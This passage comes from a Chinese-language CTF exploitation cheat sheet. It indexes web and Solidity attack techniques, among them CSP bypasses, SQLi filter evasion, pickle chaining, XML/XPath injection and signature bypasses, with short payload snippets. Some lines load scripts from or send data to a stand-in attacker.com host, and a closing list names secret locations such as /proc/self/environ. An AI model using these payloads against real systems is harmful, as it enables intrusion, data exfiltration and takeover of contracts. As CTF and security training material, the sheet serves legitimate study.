**模式：** CSP 允许 `cdnjs.cloudflare.com`。从 CDN 加载 Hyperscript（`_=` 属性）或 Alpine.js（`x-data`、`x-init`），即可执行清洗器未去除的 HTML 属性中的代码。见 [client-side-advanced.md](client-side-advanced.md#hyperscript-cdn-csp-bypass-unbreakable-2026)。

## Solidity Transient Storage Clearing Collision (0.8.28-0.8.33)

**模式：** Solidity IR pipeline（`--via-ir`）会为同类型的持久变量与瞬态变量上的 `delete` 生成同名 Yul helper。一个应调用 `sstore`，另一个应调用 `tstore`，但去重后只保留其一。利用方式包括：通过瞬态 `delete` 覆盖 `owner`（slot 0），或让持久 `delete`（撤销授权）失效。缓解方式：用 `_lock = address(0)` 代替 `delete _lock`。见 [web3.md](web3.md#solidity-transient-storage-clearing-helper-collision-solidity-0828-0833)。

## Chrome Unicode URL Normalization Bypass (RCTF 2017)

Chrome 的 IDNA/punycode 规范化会把全角 Unicode 字符（U+FF00-U+FF5E）转换成等价 ASCII，从而绕过域名长度检查和字符过滤。见 [client-side-advanced.md](client-side-advanced.md#chrome-unicode-url-normalization-bypass-rctf-2017)。

## CSP Nonce Bypass via base Tag Hijacking (BSidesSF 2026)

**模式：** CSP 使用 `script-src 'nonce-xxx'`，但缺少 `base-uri`。在带 nonce 的 `<script src="relative.js">` 前注入 `<base href="https://attacker.com/">`，脚本就会从攻击者服务器加载，同时仍因有效 nonce 通过 CSP。防御：始终加上 `base-uri 'self'`。见 [client-side-advanced.md](client-side-advanced.md#csp-nonce-bypass-via-base-tag-hijacking-bsidessf-2026)。

## JA4/JA4H TLS Fingerprint Matching (BSidesSF 2026)

**模式：** 服务端除 `User-Agent` 外，还用 JA4（TLS ClientHello 指纹）和 JA4H（HTTP 头顺序指纹）验证浏览器身份。仅伪造 UA 不够，还要匹配目标浏览器的 TLS cipher suite 顺序与 HTTP 头顺序。针对老浏览器时，直接跑真实浏览器更稳。见 [auth-and-access.md](auth-and-access.md#ja4ja4h-tls-and-http-fingerprint-matching-bsidessf-2026)。

## Client-Side HMAC Bypass via Leaked JS Secret (Codegate 2013)

反混淆前端 JS 提取硬编码 HMAC secret，再用浏览器控制台为任意请求伪造签名。见 [client-side-advanced.md](client-side-advanced.md#client-side-hmac-bypass-via-leaked-js-secret-codegate-2013)。

## SQLi Keyword Fragmentation Bypass (SecuInside 2013)

单轮 `preg_replace()` 关键字过滤，可通过在 payload 中嵌套待删除关键字来绕过：`unload_fileon` 在删掉 `load_file` 后会变成 `union`。见 [server-side-exec-2.md](server-side-exec-2.md#sqli-keyword-fragmentation-bypass-secuinside-2013)。

## Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)

去掉第一个 pickle payload 的 STOP opcode（`\x2e`），再拼接第二个 payload，可在一次 `pickle.loads()` 中执行两个 `__reduce__`。常用来串 `os.dup2()` 输出到 socket。见 [server-side-deser.md](server-side-deser.md#pickle-chaining-via-stop-opcode-stripping-volgactf-2013)。

## XPath Blind Injection (BaltCTF 2013)

`substring(normalize-space(../../../node()),1,1)='a'`，利用响应长度预言机，从 XML 数据存储中做布尔型盲提取。见 [server-side-exec.md](server-side-exec.md#xpath-blind-injection-baltctf-2013)。

## SQLite File Path Traversal to Bypass String Equality (Codegate 2013)

输入 `/../gamesim_GM` 虽然无法通过 `== "GM"` 字符串比较，但文件系统会把 `/var/game_db/gamesim_/../gamesim_GM.db` 规范化到被禁止的路径。见 [server-side-advanced-2.md](server-side-advanced-2.md#sqlite-file-path-traversal-to-bypass-string-equality-codegate-2013)。

## PHP Serialization Length Manipulation via Filter Word Expansion (0CTF 2016)

序列化后的字符串过滤器把 `"where"`（5 字符）替换成 `"hacker"`（6 字符）。重复填入 `"where"` N 次，即可让长度膨胀到刚好注入一个序列化字段（`";}s:5:"photo";s:10:"config.php";}`）。见 [server-side-deser.md](server-side-deser.md#php-serialization-length-manipulation-via-filter-word-expansion-0ctf-2016)。

## CSP Bypass via link prefetch (Boston Key Party 2016)

`<link rel="prefetch" href="http://attacker.com/steal">` 不受 CSP `script-src` 限制。另一个常见方式是 `<meta http-equiv="refresh">`。这类无脚本数据外带见 [client-side-advanced.md](client-side-advanced.md#csp-bypass-via-link-prefetch-boston-key-party-2016)。

## XML Injection via X-Forwarded-For Header (Pwn2Win 2016)

服务端直接把头部拼进 XML 且未转义。可通过 X-Forwarded-For 注入 `</ip><admin>true</admin><ip>`；在 first-tag-wins 的 XML 解析中即可生效。见 [server-side.md](server-side-2.md#xml-injection-via-x-forwarded-for-header-pwn2win-2016)。

## Base64 Decode Leniency and Parameter Override for Signature Bypass (BCTF 2016)

`b64decode()` 会静默忽略非 base64 字符。把 `&price=0` 附在签名后面，`b64decode` 会丢掉它，但参数解析器仍会处理它（且最后一个值生效）。见 [auth-infra.md](auth-infra.md#base64-decode-leniency-and-parameter-override-for-signature-bypass-bctf-2016)。

## Common Flag Locations

文件：`/flag.txt`、`/flag`、`/app/flag.txt`、`/home/*/flag*`。环境变量：`/proc/self/environ`。数据库：`flag`、`flags`、`secret` 表。响应头：`x-flag`、`x-archive-tag`、`x-proof`。DOM：`display:none` 元素、`data-*` 属性。
